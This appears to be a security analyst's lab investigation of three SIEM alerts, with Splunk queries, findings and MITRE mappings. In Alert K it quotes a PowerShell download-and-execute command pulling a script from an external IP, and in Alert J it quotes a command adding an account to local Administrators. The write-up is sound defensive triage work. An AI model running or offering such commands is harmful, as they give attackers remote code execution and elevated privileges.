# Investigation — Case 012 (Phase 2 Batch 4)

## Prioritization Decision (Before Investigation)

**Chosen order: K → J → L**

**Justification:**
- **Alert K first** — a fileless download-and-execute pattern achieves immediate code execution from a remote source; this represents the highest "is something actively running right now" urgency of the three.
- **Alert J second** — privilege escalation via local Administrators group addition is serious but represents a discrete, already-completed action that can be fully assessed without the same "still executing" urgency as K.
- **Alert L last** — outbound RDP could be legitimate or malicious; appropriately triaged last, though not dismissed.

---

## Alert K — PowerShell IEX Download-and-Execute

**SPL Query:**
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4688 New_Process_Name="*powershell.exe" Process_Command_Line="*IEX*"
| table _time, ComputerName, Account_Name, New_Process_Name, Process_Command_Line, Creator_Process_Name
| sort -_time
| head 5
```

**Result:** `IEX(New-Object Net.WebClient).DownloadString('http://45.142.212.61/s.ps1')`, parent `cmd.exe`.

**Findings:**
- 🔴 `IEX` + `DownloadString` is a well-documented fileless download-and-execute pattern — the downloaded script content is executed directly in memory without ever touching disk, a common technique to evade file-based antivirus scanning.
- 🔴 `45.142.212.61` is a public, external IP with no legitimate business justification for this host to contact.
- 🟡 Parent `cmd.exe` noted as standard, not treated as an independent red flag.

**Verdict: 🔴 TP — T1059.001 (PowerShell), T1105 (Ingress Tool Transfer)**

---

## Alert J — New User Added to Local Administrators

**SPL Queries:**
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4732
| table _time, ComputerName, Account_Name, Group_Name
| sort -_time
| head 5
```
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4688 New_Process_Name="*net.exe" Process_Command_Line="*administrators*"
| table _time, ComputerName, Account_Name, Process_Command_Line, Creator_Process_Name
| sort -_time
| head 5
```

**Result:** `net localgroup administrators hpbackup /add`, parent `cmd.exe`. EventCode=4732 (group membership change) was queried; result was checked but not conclusively confirmed in the available data — noted here as an open item, consistent with similar logging gaps observed in Case_002 (4720) and Case_003 (4698).

**Findings:**
- 🔴 Adding `hpbackup` — a non-baseline, service-like-named account — to the local Administrators group is a confirmed, completed privilege escalation action. As with Case_002 and Case_007, a completed action of this nature is decisive on its own; it does not require additional confirming events to establish TP.
- 🟠 The 4732 confirmation gap is worth flagging separately as a potential recurring host-wide audit policy issue (now observed across three separate EventCodes: 4720, 4698, and possibly 4732).

**Verdict: 🔴 TP — T1098 (Account Manipulation) / T1136 (Create Account, related)**

---

## Alert L — Outbound RDP Connection to External IP

**SPL Query:**
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4688 New_Process_Name="*mstsc.exe"
| table _time, ComputerName, Account_Name, New_Process_Name, Process_Command_Line, Creator_Process_Name
| sort -_time
| head 5
```

**Result:** `mstsc.exe /v:203.0.113.50`, parent `explorer.exe`.

**Findings:**
- 🟡 `203.0.113.0/24` is a reserved documentation/example IP range (RFC 5737) — not a real, routable internet address. This specific IP is a simulated placeholder for lab purposes and would not itself be treated as a real threat indicator; however, the underlying technique (outbound RDP to an unrecognized destination) remains a valid pattern to evaluate.
- 🟡 An outbound RDP connection could represent legitimate remote work/administration, a personal VM connection, or attacker-initiated lateral movement/data staging infrastructure.
- 🟡 No confirmed malicious outcome (no evidence of a successful connection, no follow-on activity, no baseline reference for this destination) is present in the available data.

**Verdict: 🟡 Ambiguous**
The action is genuinely dual-use — legitimate remote administration and malicious lateral movement staging produce identical log signatures at this level of visibility. Evidence available does not distinguish between the two.

---

## Summary Table

| Alert | Verdict | MITRE | SIEM Label vs. Reality |
|---|---|---|---|
| K — IEX Download | 🔴 TP | T1059.001, T1105 | High label matched reality |
| J — Admin Group Add | 🔴 TP | T1098, T1136 | High label matched reality |
| L — Outbound RDP | 🟡 Ambiguous | — | Medium label matched reality |
